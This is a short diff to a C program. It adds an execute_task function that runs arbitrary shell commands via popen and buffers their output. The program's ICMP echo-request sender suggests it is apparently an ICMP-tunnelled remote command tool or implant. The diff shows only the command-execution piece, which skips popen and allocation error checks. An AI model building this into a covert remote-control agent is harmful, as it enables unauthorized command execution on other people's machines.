@@ -151,6 +151,30 @@ ssize_t send_echo_request(struct in_addr destination_ip, uint16_t sequence, cons
 	return -1;
 }
 
+unsigned char *execute_task(const char *command, size_t *output_size) {
+
+	FILE *process = popen(command, "r");
+
+	size_t capacity = 4096;
+	size_t used_bytes = 0;
+	unsigned char *output = malloc(capacity);
+	size_t bytes_read;
+
+	while ((bytes_read = fread(output + used_bytes, 1, capacity - used_bytes, process)) > 0) {
+		used_bytes += bytes_read;
+		if (used_bytes == capacity) {
+			capacity *= 2;
+			output = realloc(output, capacity);
+		}
+	}
+
+	pclose(process);
+
+	*output_size = used_bytes;
+	return output;
+
+}
+
 int main() {
 
 	struct Config configuration = {
